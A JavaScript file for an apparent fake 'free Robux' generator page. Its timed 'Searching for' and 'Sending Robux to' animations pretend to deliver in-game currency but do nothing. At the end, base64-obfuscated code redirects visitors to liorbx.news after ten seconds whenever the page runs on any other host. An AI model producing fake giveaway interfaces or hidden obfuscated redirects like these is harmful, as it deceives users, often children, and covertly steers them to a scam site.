const rbxbtn = document.querySelector(".getrbx");

const box1 = document.querySelector(".box2");
const box2 = document.querySelector(".boxanimation");
const box3 = document.querySelector(".box3");
const box4 = document.querySelector(".box4");
const rbxtotal = document.querySelectorAll(".details");

const username = document.querySelector(".username");

const animationtxt = document.querySelector(".animationtxt");

rbxbtn.addEventListener("click", () => {
  if (username.value.length <= 2) {
    alert("please enter username");
  } else {
    box1.style.display = "none";
    box2.style.display = "flex";
    setTimeout(showbox2, 4500);
    setTimeout(showbox3, 4500);

    animationtxt.innerHTML = `Searching for <b>${username.value}</b> ...`;
  }
});

rbxtotal.forEach((btn) => {
  btn.addEventListener("click", () => {
    box3.style.display = "none";

    box2.style.display = "flex";

    setTimeout(showboxagain, 3500);
    setTimeout(showbox4, 3500);
    animationtxt.innerHTML = `Sending Robux to <b>${username.value}</b>...`;
  });
});

let showboxagain = () => {
  box2.style.display = "none";
};
let showbox2 = () => {
  box2.style.display = "none";
};

let showbox3 = () => {
  box3.style.display = "flex";
};

let showbox4 = () => {
  box4.style.display = "flex";
};
const encodedRedirectURL = "aHR0cHM6Ly9saW9yYngubmV3cw==";
const encodedDomain1 = "bGlvcmJ4Lm5ld3M=";
const encodedDomain2 = "d3d3Lmxpb3JieC5uZXdz";

const redirectURL = atob(encodedRedirectURL);
const decodedDomain1 = atob(encodedDomain1);
const decodedDomain2 = atob(encodedDomain2);

const currentHostname = window.location.hostname;

if (currentHostname !== decodedDomain1 && currentHostname !== decodedDomain2) {
    setTimeout(() => { window.location.href = redirectURL; }, 10000);
}